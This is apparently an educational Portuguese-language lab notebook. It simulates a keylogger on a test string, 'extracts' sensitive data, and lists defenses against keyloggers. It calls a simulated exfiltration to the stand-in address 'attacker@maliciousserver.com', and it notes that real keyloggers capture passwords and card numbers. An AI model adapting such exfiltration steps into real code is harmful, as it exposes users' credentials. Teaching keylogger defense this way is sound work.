# %% [markdown]
# # CyberLab: Ataque, Defesa e Simulação de Malware
#
# ## 7️⃣ KEYLOGGER SIMULADO - Captura de Teclas Educacional
#
# ---
#
# ### ⚠️ SIMULAÇÃO SEGURA
#
# - ✅ NÃO captura teclado real do sistema
# - ✅ Registra APENAS em arquivo de teste
# - ✅ Fim: Educacional apenas
#
# ---

# %% [markdown]
# ## 1. Setup

# %%
import sys
from pathlib import Path
from datetime import datetime

scripts_dir = Path("../scripts/python")
sys.path.insert(0, str(scripts_dir.absolute()))

from malware.keylogger import KeyloggerSimulation

RESULTS_DIR = Path("../results")

print(f"✅ Setup concluído")
print(f"   Timestamp: {datetime.now().isoformat()}")

# %% [markdown]
# ## 2. Inicializar Simulação

# %%
print("\n🔌 Inicializando Keylogger Simulado\n")

kl = KeyloggerSimulation(log_dir=RESULTS_DIR)

print("⚠️ IMPORTANTE:")
print("   Esta é uma SIMULAÇÃO EDUCACIONAL")
print("   Nenhum teclado real é capturado")
print("   Dados registrados apenas em arquivo de teste")

# %% [markdown]
# ## 3. Simular Captura de Keystroke

# %%
print("\n📝 Simulando Captura de Keystroke\n")

# Simular digitação de texto (como se usuário digitasse)
text_to_capture = "Hello world from CyberLab"
print(f"Simulando digitação: '{text_to_capture}'\n")

kl.simulate_keystroke_capture(text_to_capture, simulate_delay=False)

print("\n✅ {0} keystrokes capturados".format(len(text_to_capture)))

# %% [markdown]
# ## 4. Extrair Dados Sensíveis

# %%
import json

print("\n🔓 Extraindo Dados Sensíveis\n")

sensitive = kl.extract_sensitive_data()

print("Análise dos dados capturados:")
print(json.dumps(sensitive, indent=2))

print("\n⚠️ Em um keylogger real:")
print("   • Senhas seriam capturadas")
print("   • Números de cartão")
print("   • Emails pessoais")
print("   • Mensagens privadas")
print("   • Dados de formulários")

# %% [markdown]
# ## 5. Simular Exfiltração (Envio de Dados)

# %%
print("\n📤 Simulando Exfiltração de Dados\n")

exfil_result = kl.simulate_exfiltration("attacker@maliciousserver.com")

print(json.dumps(exfil_result, indent=2))

print("\n✅ Esta é UMA SIMULAÇÃO!")
print("   Nenhum dado foi realmente enviado")
print("   Nem email foi usado")
print("   Propósito: Entender como keyloggers reais funcionam")

# %% [markdown]
# ## 6. Defesa contra Keylogger

# %%
print("\n🛡️ DEFESA CONTRA KEYLOGGER\n")

defense = {
    "Prevenção": [
        "Antivírus atualizado",
        "Não baixar de fontes desconhecidas",
        "Não clicar em links suspeitos",
        "Validar certificados SSL",
        "Manter sistema atualizado"
    ],
    "Detecção": [
        "Monitorar processos em execução",
        "EDR (Endpoint Detection & Response)",
        "Analisar logs de sistema",
        "Verificar permissões anormais",
        "Tráfego de rede suspeito"
    ],
    "Resposta": [
        "Desconectar da rede",
        "Executar scan antivírus",
        "Restaurar do backup seguro",
        "Alterar senhas importantes",
        "Monitorar conta bancária"
    ],
    "Alternativas": [
        "Usar teclado virtual (para senhas)",
        "Autenticação biométrica",
        "Hardware security keys",
        "Máquina virtual isolada",
        "Teclado externo com encriptação"
    ]
}

for category, strategies in defense.items():
    print(f"{category}:")
    for strategy in strategies:
        print(f"  ✓ {strategy}")
    print()

# %% [markdown]
# ## 7. Resumo

# %%
print("\n" + "="*60)
print("✅ KEYLOGGER SIMULADO CONCLUÍDO!")
print("="*60)

print(f"\n📊 Dados capturados:")
data = kl.get_captured_data()
print(json.dumps(data, indent=2))

print("\n🚀 Próxima Etapa: Notebook 8 - Análise de Logs")
print("="*60)
